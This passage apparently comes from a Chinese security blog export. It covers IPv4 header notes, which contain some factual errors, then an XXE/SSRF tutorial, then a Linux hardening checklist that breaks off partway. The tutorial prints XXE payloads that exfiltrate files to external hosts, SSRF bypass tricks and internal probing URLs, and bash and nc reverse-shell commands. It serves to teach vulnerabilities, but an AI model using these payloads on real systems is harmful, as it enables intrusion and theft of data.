<h3 id="IP分片"><a href="#IP分片" class="headerlink" title="IP分片"></a>IP分片</h3><p>当路由器在转发IP数据包是，如果包的大小大于当前链路的MTU，路由器则会将该IP分组分节成满足MTU的数据包，进行传输，并在到达目标主机时才被进行重组。</p>
<h3 id="IP分组结构"><a href="#IP分组结构" class="headerlink" title="IP分组结构"></a>IP分组结构</h3><p>由首部与数据量部分组成，首部包好20字节的固定部分以及可选部分</p>
<h2 id="IP报文首部"><a href="#IP报文首部" class="headerlink" title="IP报文首部"></a>IP报文首部</h2><p>IP Version———IP版本号，4bits,ipv4-0100、ipv6-0110</p>
<p>Hdr Len———头部长度，4bits。一个位表示4个字节，即最大可以表示60个字节长度，一般为0101&#x3D;0d5,即20个字节。</p>
<p>Type of Service(QOS、TOS)——优先级及服务类型，8bits，前三位为优先级，中间3位为服务类型,D:低延时，T高吞吐量，R高稳定性，后两位为ECN。QOS:提供了8种服务优先级，优先级越高的报文将被优先处理。TOS:提供了三种不同的服务类型，分别为D-低时延，T-高吞吐量，R-高可靠性。ECN:当一个带有ECN标志的分组被发送后，如果接收端“”持续拥塞且具有“感知ECN”的能力，那么接收端会通知发送端降低发送速度。</p>
<p>Total Length———总长度，16bits，单位：字节，首部与数据部分之和的长度，单位为字节，故数据报的最大长度为65535个字节，但受MTU的限制，此值只是理论上的值。</p>
<p>Indentification(Fragment ID)-标示，16bits，为片分类，数据在数据链路层会进行分片操作，此标志表示该分片属于某一帧。</p>
<p>R——1bit 保留</p>
<p>DF——1bit，Do not Fragment ,是否分片,1表示未分片，0表示已分片</p>
<p>MF——1bit，More Fragment，是否最后一片，0表示是最后一个分片，1表示不是</p>
<p>Fragment Offset——，13bits，片偏移，后一个片从前一个片的哪个位置开始拼接，单位为：8Bytes</p>
<p>Time To Live(TTl)——8bits，最大生存时间，数据帧每经过一个路由器该值就减1，当该值为零时，数据将被丢弃，丢弃的网络设备将给发送方回包。防止数据在网络上无限循环。linux一般小于100，windows一般大于128。</p>
<p>Protocol———8bits，协议号：TCP-6，UDP-17,IP-0x0800,ARP-0x0860</p>
<p>Header Checksum——-16bits，首部校验和</p>
<p>Source IP Address——16bits，源IP地址</p>
<p>Destination IP Address——-16bits，目的IP地址</p>
<p>Options———40Bytes，可选项：一般一些特殊的要求会加在这个部分。例如：松散路由，严格路由，路由记录，时间戳。</p>
<p>Data———数据部分</p>
<p><img src="/archives/eecf3b2/20200807132831372.png"></p>
<h3 id="IP报头举例："><a href="#IP报头举例：" class="headerlink" title="IP报头举例："></a>IP报头举例：</h3><p>0100 0101 00000000 0000000000101000 1100000101111010 010 0000000000000 01000000 00000110 0000001000000101 11000000 10101000 00000011 00000111 11001010 01011001 11101001 01000111</p>
<ul>
<li>1-4bit：0100——IPv4</li>
<li>5-8bit：0101——首部长度为20字节</li>
<li>9-16bit：00000000———服务类型与优先级</li>
<li>17-32bit：0000000000101000 ——整个IP包的长度，40字节</li>
<li>33-48bit：1100000101111010——-49530，片标识</li>
<li>49-51bit：010 ———第一位保留，未分片，是最后一个分片</li>
<li>52-64bit：0000000000000———未曾分片，故无偏移</li>
<li>65-72bit：01000000———64，生存时间</li>
<li>73-80bit ：00000110———6，TCP协议</li>
<li>81-96bit ：0000001000000101 ———517，首部校验和</li>
<li>97-128bit ：11000000 10101000 00000011 00000111——-192.168.3.7 源IP地址</li>
<li>129-160bit ： 11001010 01011001 11101001 01000111———202.89.233.71 目标IP地址</li>
</ul>
<p><img src="/archives/eecf3b2/20200807134300500.png"></p>
<h2 id="IPv4地址"><a href="#IPv4地址" class="headerlink" title="IPv4地址"></a>IPv4地址</h2><h3 id="IP地址构成"><a href="#IP地址构成" class="headerlink" title="IP地址构成"></a>IP地址构成</h3><p>IPv4地址由32位二进制组成，每8位划分为1组，转换为十进制表示为xxx.xxx.xxx.xxx，这种表示方法被称为点分十进制</p>
<p>IPv6地址由128位二进制组成，每16位划分为一组，每一组内每4位有一个16进制数表示</p>
<h3 id="IPv4地址分类："><a href="#IPv4地址分类：" class="headerlink" title="IPv4地址分类："></a>IPv4地址分类：</h3><p>A类：0~127，二进制第一位为0，即0xxxxxxxx</p>
<p>B类：128~191，二进制第一位为1,第二位为0，即10xxxxxx</p>
<p>C类：192~223，二进制第一位为1，第二位为1，第三位为0，即110xxxxx</p>
<p>D类：224~239,二进制第一位为1，第二位为1，第三位为1，第四位为0，即1110xxxx，组播地址</p>
<p>E类：240~255，二进制第一位为1，第二位为1，第三位为1，第四位为1，即1111xxxx</p>
<p><em><strong>如何获取一个IP地址的子网标识？</strong></em></p>
<p>将该IP地址与其子网掩码进行按位与运算即得到其子网地址</p>
<p><em><strong>如何获取一个IP地址的广播地址？</strong></em></p>
<p>将该IP地址的子网掩码按位取反之后再与该IP进行按位或操作即可。</p>
<h3 id="特殊IPv4地址"><a href="#特殊IPv4地址" class="headerlink" title="特殊IPv4地址"></a>特殊IPv4地址</h3><ul>
<li>127.0.0.0&#x2F;8：回环地址，表示该设备本身</li>
<li>当主机号为0时表示该网络本身，即该网络里的第一个地址：如，192.168.2.0&#x2F;255.255.255.0</li>
<li>当主机号为255时表示该网络的广播地址，即该网络的最后一个地址</li>
<li>255.255.255.255 为整个互联网的广播地址</li>
</ul>
<h3 id="IPv4地址耗尽解决方案"><a href="#IPv4地址耗尽解决方案" class="headerlink" title="IPv4地址耗尽解决方案"></a>IPv4地址耗尽解决方案</h3><p>传统的IPv4地址被认为的划分为不容的种类，其网络号被限定在8、16、24位，新的解决方案突破了这个限制通过前缀来限定不同的网络，也就没有了地址分类这种说法，扩大了IP地址的可利用率。如：10.0.0.1&#x2F;18，其中的18表示该IP地址中前18位表示了网络号，后12位表示主机号。</p>
]]></content>
      <categories>
        <category>安全技术</category>
        <category>协议规范</category>
      </categories>
      <tags>
        <tag>TCP</tag>
        <tag>UDP</tag>
        <tag>IP</tag>
      </tags>
  </entry>
  <entry>
    <title>XXE与SSRF</title>
    <url>/archives/4e6e7714.html</url>
    <content><![CDATA[<h1 id="XXE-and-SSRF"><a href="#XXE-and-SSRF" class="headerlink" title="XXE and SSRF"></a>XXE and SSRF</h1><h1 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h1><h2 id="XXE-外部实体注入漏洞"><a href="#XXE-外部实体注入漏洞" class="headerlink" title="XXE - 外部实体注入漏洞"></a>XXE - 外部实体注入漏洞</h2><p>利用了网站在解析xml文件的时候，可以引入外部实体的特性，而外部实体可以使用各种协议如，php:&#x2F;&#x2F;filter ftp http file，等方式获得本地的，网络的资源，从而使我们上传的恶意dtd文件中的payload得以执行。</p>
<h3 id="漏洞代码"><a href="#漏洞代码" class="headerlink" title="漏洞代码"></a>漏洞代码</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    <span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">false</span>);    <span class="variable">$xmlfile</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;php://input&quot;</span>);    <span class="variable">$dom</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();    <span class="variable">$dom</span> -&gt; <span class="title function_ invoke__">loadXML</span>(<span class="variable">$xmlfile</span>,LIBXML_BIGLINES | LIBXML_NOWARNING | LIBXML_NOENT | LIBXML_DTDLOAD);    <span class="variable">$creds</span> = <span class="title function_ invoke__">simplexml_import_dom</span>(<span class="variable">$dom</span>);    <span class="keyword">echo</span> <span class="variable">$creds</span>  <span class="comment">#注释这一行的话就是没有回显的xxe?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="有回显的XXE"><a href="#有回显的XXE" class="headerlink" title="有回显的XXE"></a>有回显的XXE</h3><p><strong>判断方式</strong></p>
<p>修改网页的请求方式为post，post的数据修改为任意xml标签，如：ggggg,如果ggggg成功再页面中显示出来，则存在有回显的XXE漏洞。</p>
<p><strong>利用</strong></p>
<p>此时只需直接构造如下payload上传即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE data [&lt;!ENTITY test SYSTEM &quot;file:///etc/password&quot;&gt;]&gt;&lt;data&gt;&amp;data;&lt;/data&gt;//如此便可获取linux系统的密码文件中的内容</span><br></pre></td></tr></table></figure>

<h3 id="无回显的XXE"><a href="#无回显的XXE" class="headerlink" title="无回显的XXE"></a>无回显的XXE</h3><p>即blind oob XXE ——-oob out of band 带外通信</p>
<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p><strong>可以访问外网服务器的DTD</strong></p>
<p>构造上传的xml文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;&lt;!DOCTYPE data SYSTEM &quot;http://192.168.0.104/ .dtd&quot;&gt;&lt;data&gt;&amp;send;&lt;/data&gt;</span><br></pre></td></tr></table></figure>

<p>构造外带的dtd文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % win SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///C://Windows//system.ini&quot;&gt;&lt;!ENTITY % wrapper &quot;&lt;!ENTITY send SYSTEM &#x27;http://192.168.248.171:1337/?%win;&#x27;&gt;&quot;&gt;%wrapper;</span><br></pre></td></tr></table></figure>

<p>上述代码用到了php为协议讲需要外带的数据进行base64编码，以避免一些敏感字符引起的错误。</p>
<p>为什么需要使用外带dtd实体</p>
<p>因为内部实体中使不允许使用参数实体的，但在外带实体中则不受此限制</p>
<p>为什么需要使用实体嵌套</p>
<p>因为同级的参数实体不能互相解析，嵌套的第二层需要对%进行转义成为&amp;#x25，不然可能出现问题，三层嵌套则需对&amp; % “ ’等进行转义。在实体的申明中不能引用参数实体，这一w3c标准被xml解析器的支持不是很好，如果使二层嵌套，大部分xml解析器都能成功识别，但如果在三层前逃离里面使用了引用了参数实体，那么很多xml解析器就不能成功地识别，于是乎，我们就可以不使用外带dtd来进行注入，而只需使用内部dtd即可。</p>
<p><code>参数实体只能在DTD中使用，普通实体可以在DTD中引用，可以在XML中引用，可以在声明前引用，还可以在实体声明内部引用。</code></p>
<p>在内部DTD集中，参数实体的引用不能存在于标记的声明中。这并不适用于外部的参数实体中。</p>
<p><strong>不可以访问外网服务器DTD</strong></p>
<p>如果安全过滤较为严格，当前解析器被禁止了访问外网服务器的DTD，那么我们可以利用本地服务器中默认存在的DTD文件，通过重写其中的实体来构造我们需要的实体。</p>
<p>再unbantu中就存在这么一个文件：&#x2F;usr&#x2F;share&#x2F;yelp&#x2F;dtd&#x2F;docbookx.dtd</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE message [    &lt;!ENTITY % remote SYSTEM &quot;/usr/share/yelp/dtd/docbookx.dtd&quot;&gt;    &lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///flag&quot;&gt;    &lt;!ENTITY % ISOamso &#x27; //此为预置的实体        &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; send SYSTEM &amp;#x27;http://myip/?&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;        &amp;#x25;eval;        &amp;#x25;send;    &#x27;&gt;    %remote;]&gt;&lt;message&gt;1234&lt;/message&gt;</span><br></pre></td></tr></table></figure>

<h2 id="基于报错的BLIND-XXE"><a href="#基于报错的BLIND-XXE" class="headerlink" title="基于报错的BLIND XXE"></a>基于报错的BLIND XXE</h2><p>基于报错的原理和OOB类似，OOB通过构造一个带外的url将数据带出，而基于报错是构造一个错误的url并将泄露文件内容放在url中，通过这样的方式返回数据。 <strong><code>类似于sqli中的报错注入</code></strong></p>
<p><strong>引入网络文件</strong></p>
<p>xml</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE message [    &lt;!ENTITY % remote SYSTEM &quot;http://blog.szfszf.top/xml.dtd&quot;&gt;    &lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///flag&quot;&gt;    %remote;    %send;]&gt;&lt;message&gt;1234&lt;/message&gt;</span><br></pre></td></tr></table></figure>

<p>dtd文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % start &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;file:///hhhhhhh/%file;&#x27;&gt;&quot;&gt;%start;   ///hhhhh这个目录不存在，于是会报错，讲%file的内容回显到浏览器。</span><br></pre></td></tr></table></figure>

<p>引用本地文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE message [    &lt;!ENTITY % remote SYSTEM &quot;/usr/share/yelp/dtd/docbookx.dtd&quot;&gt;    &lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///flag&quot;&gt;    &lt;!ENTITY % ISOamso &#x27;        &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; send SYSTEM &amp;#x27;file://hhhhhhhh/?&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;        &amp;#x25;eval;        &amp;#x25;send;    &#x27;&gt;    %remote;]&gt;&lt;message&gt;1234&lt;/message&gt;</span><br></pre></td></tr></table></figure>

<h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><p>ssrf-服务端请求伪造 sever-side request forgery</p>
<p>成因：服务端提供了从其他服务器获取数据的功能，但没有对目标地址做合理的限制与过滤，使得我们可以利用其来探测内网状态，获取内网资源，读取本地文件，测试内网或者本地的应用程序。</p>
<h2 id="漏洞代码-1"><a href="#漏洞代码-1" class="headerlink" title="漏洞代码"></a>漏洞代码</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php    function curl($url)&#123;        $ch=curl_init();        curl_setpot($ch,CURLOPT_URL,$url);        curl_setopt($ch,CURLOPT_HEADER,0);        curl_exec($ch);        curl_close($ch);&#125;$url=$_GET[&quot;url&quot;]curl($url);?&gt;</span><br></pre></td></tr></table></figure>

<h3 id="漏洞函数：file-get-contents-fsockopen-curl-exec"><a href="#漏洞函数：file-get-contents-fsockopen-curl-exec" class="headerlink" title="漏洞函数：file_get_contents\fsockopen\curl_exec"></a>漏洞函数：<code>file_get_contents\fsockopen\curl_exec</code></h3><p><strong>file_get_contents</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?phpif (isset($_POST[&#x27;url&#x27;]))&#123;$content=file_get_contents($_POST[&#x27;url&#x27;]);$filename=&#x27;./images/&#x27;.rand().&#x27;img1.jpg&#x27;;file_put_contents($filename,$content);echo $_POST[&#x27;url&#x27;];$img=&quot;&lt;img src=\&quot;&quot;.$filename.&quot;\&quot;/&gt;&quot;;&#125;echo $img?&gt;</span><br></pre></td></tr></table></figure>

<h2 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h2><p>直接更换输入点为我们需要访问地资源地址</p>
<h2 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h2><ol>
<li><p><a href="http://www.baidu.com@www.sina.com/">http://www.baidu.com@www.sina.com</a></p>
</li>
<li><p>使用十进制ip地址，十六进制IP地址前面加0x，八进制前面加0，</p>
</li>
<li><p>使用ip地址，不适用域名</p>
</li>
<li><p>使用短网址</p>
</li>
<li><p>自己注册一个域名，指向127.0.0.1</p>
</li>
<li><p>使用xip.io <a href="http://xx.xx.xx.xx.182.1.3.4.xip.io/">http://xx.xx.xx.xx.182.1.3.4.xip.io</a> <a href="http://xx.182.1.3.4.xip.io/">http://xx.182.1.3.4.xip.io/</a> &#x3D;&#x3D;&#x3D;&#x3D;<a href="http://182.1.3.4/">http://182.1.3.4</a></p>
</li>
<li><p>加上端口号绕过</p>
</li>
<li><p>加上根域.</p>
</li>
<li><p>使用中文句号替换.</p>
</li>
<li><p>使用enclosed alphanumrics ①②③④⑤⑥⑦⑧⑨⑩⑪⑫⑬⑭⑮⑯⑰⑱⑲⑳⑴⑵⑶⑷⑸⑹⑺⑻⑼⑽⑾⑿⒀⒁⒂⒃⒄⒅⒆⒇⒈⒉⒊⒋⒌⒍⒎⒏⒐⒑⒒⒓⒔⒕⒖⒗⒘⒙⒚⒛⒜⒝⒞⒟⒠⒡⒢⒣⒤⒥⒦⒧⒨⒩⒪⒫⒬⒭⒮⒯⒰⒱⒲⒳⒴⒵ⒶⒷⒸⒹⒺⒻⒼⒽⒾⒿⓀⓁⓂⓃⓄⓅⓆⓇⓈⓉⓊⓋⓌⓍⓎⓏⓐⓑⓒⓓⓔⓕⓖⓗⓘⓙⓚⓛⓜⓝⓞⓟⓠⓡⓢⓣⓤⓥⓦⓧⓨⓩ⓪⓫⓬⓭⓮⓯⓰⓱⓲⓳⓴⓵⓶⓷⓸⓹⓺⓻⓼⓽⓾⓿</p>
</li>
<li><p>dns rebinding</p>
<p><a href="https://blog.csdn.net/qq_45449318/article/details/112916226">关于DNS-rebinding的总结_灰太的表格的博客-CSDN博客</a></p>
<p><a href="https://www.freebuf.com/column/194861.html">DNS Rebinding 域名重新绑定攻击技术 - FreeBuf网络安全行业门户</a></p>
<ol>
<li><strong>dns重绑定技术，有三种利用姿势，</strong><ol>
<li>利用ttl值，设置ttl值为0，每次访问同一域名都要进行一次域名解析，第一次解析出来一个外网地址，第二次解析出来内网地址。手动修改两次解析的结果。使两次访问不同的ip但域名还是一样的。国内的ttl值不能设置为0，需使用国外的。</li>
<li>域名绑定两个ip，能不能成功全靠运气。</li>
</ol>
</li>
</ol>
<p><img src="https://www.notion.so/XXE%20and%20SSRF%20b66bc33c063d492e8b83706ebb9e8b66/Untitled.png"></p>
<p>XXE%20and%20SSRF%20b66bc33c063d492e8b83706ebb9e8b66&#x2F;Untitled.png</p>
<p>3，自建一台dns服务器，解析结果全由自己控制。</p>
</li>
</ol>
<p><img src="https://www.notion.so/XXE%20and%20SSRF%20b66bc33c063d492e8b83706ebb9e8b66/Untitled%201.png"></p>
<p>XXE%20and%20SSRF%20b66bc33c063d492e8b83706ebb9e8b66&#x2F;Untitled%201.png</p>
<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p><strong>使用bash</strong></p>
<blockquote>
<p>被攻击者执行命令：bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;127.0.0.1&#x2F;5555 0&gt;&amp;1</p>
</blockquote>
<blockquote>
<p>攻击者监听本机的5555端口：nc -lvp 5555</p>
</blockquote>
<p><strong>使用nc</strong></p>
<p>正向nc</p>
<blockquote>
<p>nc -lvp 7777 -e &#x2F;bin&#x2F;bash &#x2F;&#x2F;将cmd映射到本地的7777端口</p>
</blockquote>
<blockquote>
<p>nc 172.16.11.6 7777&#x2F;&#x2F;主动去连</p>
</blockquote>
<p>方向nc</p>
<blockquote>
<p>nc -e &#x2F;bin&#x2F;bash 172.16.11.6 7777 &#x2F;&#x2F;将cmd.exe发送到控制端主机的7777端口</p>
</blockquote>
<blockquote>
<p>nc -lvp 7777 &#x2F;&#x2F;监听7777端口</p>
</blockquote>
<h3 id="内网端口探测"><a href="#内网端口探测" class="headerlink" title="内网端口探测"></a>内网端口探测</h3><p><code>http://172.16.11.6/ssrf.php?url=dict://172.16.11.41:3306/info</code> info为固定写法</p>
<p><code>http://172.16.11.6/ssrf.php?url=gopher://172.16.11.41:3306/_info</code> gopher协议</p>
]]></content>
      <categories>
        <category>安全技术</category>
        <category>漏洞原理</category>
      </categories>
      <tags>
        <tag>XXE</tag>
        <tag>漏洞原理</tag>
        <tag>PHP</tag>
        <tag>SSRF</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux安全配置基线</title>
    <url>/archives/7cd2fa35.html</url>
    <content><![CDATA[<h1 id="linux安全配置基线"><a href="#linux安全配置基线" class="headerlink" title="linux安全配置基线"></a>linux安全配置基线</h1><h1 id="一、共享账号检查"><a href="#一、共享账号检查" class="headerlink" title="一、共享账号检查"></a>一、共享账号检查</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">配置名称：用户账号分配检查，避免共享账号存在</span><br><span class="line">配置要求：1、系统需按照实际用户分配账号；</span><br><span class="line">          2、避免不同用户间共享账号，避免用户账号和服务器间通信使用的账号共享。</span><br><span class="line">操作指南：参考配置操作：cat /etc/passwd查看当前所有用户的情况；</span><br><span class="line">检查方法：命令cat /etc/passwd查看当前所有用户的信息，与管理员确认是否有共享账号情况存在。</span><br><span class="line">配置方法：如需建立用户，参考如下：</span><br><span class="line">          #useradd username  #创建账号</span><br><span class="line">          #passwd username   #设置密码</span><br><span class="line">          使用该命令为不同的用户分配不同的账号，设置不同的口令及权限信息等。</span><br><span class="line">适用版本：Linux Redhat AS 3、Linux Redhat AS 4</span><br></pre></td></tr></table></figure>

<h1 id="二、多余账户锁定"><a href="#二、多余账户锁定" class="headerlink" title="二、多余账户锁定"></a>二、多余账户锁定</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">配置名称：多余账户锁定策略</span><br><span class="line">配置要求：应锁定与设备运行、维护等工作无关的账号。</span><br><span class="line">操作指南：参考配置操作：</span><br><span class="line">          查看锁定用户：</span><br><span class="line">          # cat /etc/password，查看哪些账户的shell域中为nologin；</span><br><span class="line">检查方法：人工检查：</span><br><span class="line">          	# cat /etc/password后查看多余账户的shell域为nologin为符合；</span><br><span class="line">          BVS基线检查：</span><br><span class="line">          	多余账户处于锁定状态为符合。</span><br><span class="line">配置方法：锁定用户：</span><br><span class="line">        修改/etc/password文件，将需要锁定的用户的shell域设为nologin；</span><br><span class="line">        或通过#passwd –l username锁定账户；</span><br><span class="line">        只有具备超级用户权限的使用者方可使用#passwd –l username锁定用户,用#passwd –d username解锁后原有密码失效，登录需输入新密码。</span><br><span class="line">        补充操作说明：</span><br><span class="line">        一般情况下，需要锁定的用户：lp,nuucp,hpdb,www,demon</span><br><span class="line">适用版本：Linux Redhat AS 3、Linux Redhat AS 4</span><br></pre></td></tr></table></figure>

<h1 id="三、root账户登录控制"><a href="#三、root账户登录控制" class="headerlink" title="三、root账户登录控制"></a>三、root账户登录控制</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">配置名称：root账户远程登录账户限制</span><br><span class="line">配置要求：1、限制具备超级管理员权限的用户远程登录。</span><br><span class="line">          2、远程执行管理员权限操作，应先以普通权限用户远程登录后，再切换到超级管理员权限账号后执行相应操作。</span><br><span class="line">操作指南：使用root账户远程尝试登陆</span><br><span class="line">检查方法：1、root远程登录不成功，提示“Not on system console”；</span><br><span class="line">         2、普通用户可以登录成功，而且可以切换到root用户；</span><br><span class="line">配置方法：修改/etc/ssh/sshd_config文件，将PermitRootLogin yes改为PermitRootLogin no，重启sshd服务。</span><br><span class="line">适用版本：Linux Redhat AS 3、Linux Redhat AS 4</span><br></pre></td></tr></table></figure>

<h1 id="四、口令复杂度要求"><a href="#四、口令复杂度要求" class="headerlink" title="四、口令复杂度要求"></a>四、口令复杂度要求</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">配置名称：操作系统口令复杂度策略</span><br><span class="line">配置要求：口令长度至少12位，并包括数字、小写字母、大写字母和特殊符号。</span><br><span class="line">操作指南：1、参考配置操作</span><br><span class="line">        # cat /etc/pam.d/system-auth，找到password模块接口的配置部分，找到类似如下的配置行：</span><br><span class="line">        password  requisite  /lib/security/$ISA/pam_cracklib.so minlen =6</span><br><span class="line">        2、补充操作说明</span><br><span class="line">        参数说明如下：</span><br><span class="line">        1、retry=N，确定用户创建密码时允许重试的次数；</span><br><span class="line">        2、minlen=N，确定密码最小长度要求，事实上，在默认配置下，此参数代表密码最小长度为N-1；</span><br><span class="line">        3、dcredit=N，当N小于0时，代表新密码中数字字符数量不得少于（-N）个。例如，dcredit=-2代表密码中要至少包含两个数字字符；</span><br><span class="line">        4、ucredit=N，当N小于0时，代表则新密码中大写字符数量不得少于（-N）个；</span><br><span class="line">        5、lcredit=N，当N小于0时，代表则新密码中小写字符数量不得少于（-N）个；</span><br><span class="line">        6、ocredit=N，当N小于0时，代表则新密码中特殊字符数量不得少于（-N）个；</span><br><span class="line">检查方法：# cat /etc/pam.d/system-auth，参考操作指南检查对应参数</span><br><span class="line">         	口令的最小长度至少12位</span><br><span class="line">         	口令最少应包含的字符数量</span><br><span class="line">         	口令中最少应包含的字母字符数量</span><br><span class="line">         	口令中最少应包含的非字母数字字符数量</span><br><span class="line">         通过以上4子项的输出综合判断该项是否满足。</span><br><span class="line">配置方法：# vi /etc/pam.d/system-auth，找到password模块接口的配置部分，按照配置要求内容修改对应属性。</span><br><span class="line">适用版本：Linux Redhat AS 4</span><br></pre></td></tr></table></figure>

<h1 id="五、口令最长生存期策略"><a href="#五、口令最长生存期策略" class="headerlink" title="五、口令最长生存期策略"></a>五、口令最长生存期策略</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">配置名称：口令最长生存期策略</span><br><span class="line">配置要求：要求操作系统的账户口令的最长生存期不长于90天</span><br><span class="line">操作指南：# cat /etc/login.defs文件中指定配置项，其中：</span><br><span class="line">          PASS_MAX_DAYS配置项决定密码最长使用期限；</span><br><span class="line">          PASS_MIN_DAYS配置项决定密码最短使用期限；</span><br><span class="line">          PASS_WARN_AGE配置项决定密码到期提醒时间。</span><br><span class="line">检查方法：PASS_MAX_DAYS值小于等于90为符合；</span><br><span class="line">         “对于采用静态口令认证技术的设备，账户口令的生存期不长于90天”项的当前值：表示当前的口令生存期长度。</span><br><span class="line">配置方法：vi /etc/login.defs文件，修改PASS_MAX_DAYS值为小于等于9</span><br><span class="line">适用版本：Linux Redhat AS 3、Linux Redhat AS 4</span><br></pre></td></tr></table></figure>

<h1 id="六、系统关键目录访问权限"><a href="#六、系统关键目录访问权限" class="headerlink" title="六、系统关键目录访问权限"></a>六、系统关键目录访问权限</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">配置名称：关键目录权限控制</span><br><span class="line">配置要求：根据安全需要，配置某些关键目录其所需的最小权限；</span><br><span class="line">          重点要求password配置文件、shadow文件、group文件权限。</span><br><span class="line">         当前主流版本的linux系统在默认情况下即对重要文件做了必要的权限设置，在日常管理和操作过程中应避免修改此类文件权限，除此以外，</span><br><span class="line">         应定期对权限进行检查及复核，确保权限设置正确。</span><br><span class="line">操作指南：查看关键目录的用户对应权限参考命令</span><br><span class="line">          ls -l /etc/passwd</span><br><span class="line">          ls -l /etc/shadow</span><br><span class="line">          ls -l /etc/group</span><br><span class="line">检查方法：与管理员确认已有权限为最小权限。</span><br><span class="line">配置方法：参考配置操作：</span><br><span class="line">        通过chmod命令对目录的权限进行实际设置。</span><br><span class="line">        补充操作说明：</span><br><span class="line">        	/etc/passwd 所有用户都可读，root用户可写 –rw-r—r— </span><br><span class="line">        配置命令：chmod 644 /etc/passwd</span><br><span class="line">        	/etc/shadow 只有root可读 –r-------- </span><br><span class="line">        配置命令：chmod 600 /etc/shadow；</span><br><span class="line">        	/etc/group 必须所有用户都可读，root用户可写 –rw-r—r—</span><br><span class="line">        配置命令：chmod 644 /etc/group；</span><br><span class="line">        如果是有写权限，就需移去组及其它用户对/etc的写权限（特殊情况除外）执行命令#chmod -R go-w,o-r /etc</span><br><span class="line">适用版本：Linux Redhat AS 3、Linux Redhat AS 4</span><br></pre></td></tr></table></figure>

<h1 id="七、用户缺省权限控制"><a href="#七、用户缺省权限控制" class="headerlink" title="七、用户缺省权限控制"></a>七、用户缺省权限控制</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">配置名称：用户缺省权限控制</span><br><span class="line">配置要求：控制用户缺省访问权限，当在创建新文件或目录时应屏蔽掉新文件或目录不应有的访问允许权限,防止同属于</span><br><span class="line">该组的其它用户及别的组的用户修改该用户的文件或更高限制。</span><br><span class="line">操作指南：1、# cat /etc/bashrc  查看全局默认设置umask值</span><br><span class="line">          2、查看具体用户home目录下bash_profile，具体用户的umask</span><br><span class="line">检查方法：查看全局默认设置umask值为027或更小权限为符合（如有特许权限需求，可根据实际情况判断）；</span><br><span class="line">          查看具体用户的umask，本着最小权限的原则。</span><br><span class="line">配置方法：参考配置操作：</span><br><span class="line">          单独针对用户设置</span><br><span class="line">          可修改用户home目录下的.bash_profile脚本文件，例如，可增加一条语句：umask 027；对于权限要求较严格的场合，建议设置为077。</span><br><span class="line">          全局默认设置：</span><br><span class="line">          默认通过全局脚本/etc/bashrc设置所有用户的默认umask值，修改脚本即可实现对用户默认umask值的全局性修改，</span><br><span class="line">          通常建议将umask设置为027以上，对于权限要求较严格的场合，建议设置为077。</span><br><span class="line">适用版本：Linux Redhat AS 3、Linux Redhat AS 4</span><br></pre></td></tr></table></figure>

<h1 id="八、安全日志完备性要求"><a href="#八、安全日志完备性要求" class="headerlink" title="八、安全日志完备性要求"></a>八、安全日志完备性要求</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">配置名称：安全日志完备性要求</span><br><span class="line">配置要求：系统应配置完备日志记录，记录对与系统相关的安全事件。</span><br><span class="line">操作指南：1、# cat /etc/syslog.conf查看是否有对应配置</span><br><span class="line">          2、# cat /var/log/secure查看是否有对应配置</span><br><span class="line">检查方法：1、cat /etc/syslog.conf确认有对应配置；</span><br><span class="line">          2、查看/var/log/secure，应记录有需要的设备相关的安全事件。</span><br><span class="line">配置方法：修改配置文件vi /etc/syslog.conf。</span><br><span class="line">          配置如下类似语句：</span><br><span class="line">          authpriv.*			/var/log/secure</span><br><span class="line">          